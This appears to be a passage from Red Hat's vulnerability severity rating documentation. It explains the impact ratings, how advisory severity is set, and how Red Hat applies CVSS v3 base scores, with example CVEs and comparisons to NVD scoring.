| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.
